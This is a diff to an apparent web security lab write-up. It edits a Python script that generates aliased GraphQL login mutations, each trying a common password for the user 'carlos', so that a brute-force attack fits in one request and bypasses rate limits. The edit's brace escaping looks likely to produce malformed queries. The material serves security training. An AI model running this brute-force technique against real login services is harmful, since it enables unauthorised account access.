@@ -582,17 +582,18 @@ passwords = "123456,password,12345678,qwerty".split(',')
 
 mutations = []
 for index, element in enumerate(passwords):
+    # Escape braces with backslash
     mutation = (
-        f"bruteforce{index}: login(input: &#123; password: \"{element}\", username: \"carlos\" &#125;) {{\n"
+        f"bruteforce{index}: login(input: \\{{ password: \"{element}\", username: \"carlos\" \\}}) {{\n"
         "    token\n"
         "    success\n"
         "}\n"
     )
     mutations.append(mutation)
 
-query = "\n".join(mutations)
+# Wrap in triple backticks for Markdown + optional GraphQL syntax highlighting
+query = "```graphql\n" + "\n".join(mutations) + "\n```"
 print(query)
-
 
 ```
 
@@ -678,6 +679,7 @@ Store and deliver to victum and lab is solved
 
 
 ---
+
 
 
 
